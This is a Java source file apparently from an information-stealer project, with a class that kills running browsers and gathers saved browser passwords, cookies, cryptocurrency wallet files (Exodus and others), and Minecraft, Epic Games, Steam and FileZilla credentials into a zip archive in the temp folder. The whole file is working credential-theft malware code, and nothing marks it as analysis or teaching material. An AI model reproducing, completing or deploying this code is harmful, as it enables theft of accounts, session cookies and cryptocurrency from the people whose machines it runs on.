package dev.client.utils.files;


import dev.client.module.applications.EpicGames;
import dev.client.module.applications.Minecraft;
import dev.client.module.browsers.KillBrowsers;
import dev.client.module.browsers.Passwords;
import dev.client.module.browsers.cookies.All;
import dev.client.module.browsers.cookies.util.util;
import dev.client.module.wallets.ColdWallets;

import java.io.*;
import java.util.Base64;
import java.util.Map;
import java.util.zip.ZipOutputStream;


import static dev.client.module.browsers.cookies.All.paths;
import static dev.client.utils.files.EntryUtil.addEntry;
import static dev.client.utils.files.FolderUtil.addFolder;
import static dev.client.utils.files.FileUtil.addToZip;


public class ZipAll {

    public static void getEverything()
    {

        KillBrowsers.kill();
        String passwords = new Passwords().grabPassword();
        String zip = System.getProperty("java.io.tmpdir") + "papichulo.zip";
        File FileZilla = new File(System.getenv("APPDATA") + "\\FileZilla");
        File Steam = new File("C:\\Program Files (x86)\\Steam\\config");
        File Exodus = new File(System.getenv("APPDATA") + "\\Exodus\\exodus.wallet");
        Minecraft minecraft = new Minecraft();
        ColdWallets w = new ColdWallets();
        EpicGames epic = new EpicGames();
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zip))) {
            Map<String, File> minecraftFiles = minecraft.getAllFiles();
            for (Map.Entry<String, File> entry : minecraftFiles.entrySet()) {
                String minecraftFolder = "Minecraft/" + entry.getKey();
                File minecraftAccounts = entry.getValue();
                addToZip(zos, minecraftFolder, minecraftAccounts);
            }
           Map<String, String> browserCookies = util.getAllBrowserCookies();
           for (Map.Entry<String, String> entry : browserCookies.entrySet()) {
               String browserFolder = "Browsers/Cookies/" + entry.getKey() + ".txt";
               String encodedCookieData = entry.getValue();
               byte[] cookieData = Base64.getDecoder().decode(encodedCookieData);
               addEntry(zos, browserFolder, cookieData);
           }
            Map<String, File> wallets = w.getAllFiles();
            for (Map.Entry<String, File> entry : wallets.entrySet()) {
                String Wallets = "Wallets/" + entry.getKey();
                File coldwallets = entry.getValue();
                addFolder(zos, Wallets, coldwallets);
            }

            addEntry(zos, "Browsers/Passwords.txt",  Base64.getDecoder().decode(passwords));
            // Applications
            addToZip(zos, "Epic/", epic.getEpic());
            addToZip(zos, "Wallets/", Exodus);
            addFolder(zos, "Steam/", Steam);
            addFolder(zos, "FileZilla/", FileZilla);
            zos.finish();
            // Final
        } catch (Exception e) {
            System.out.println("a ber panocha " + e);
            e.printStackTrace();
        }
    }
}
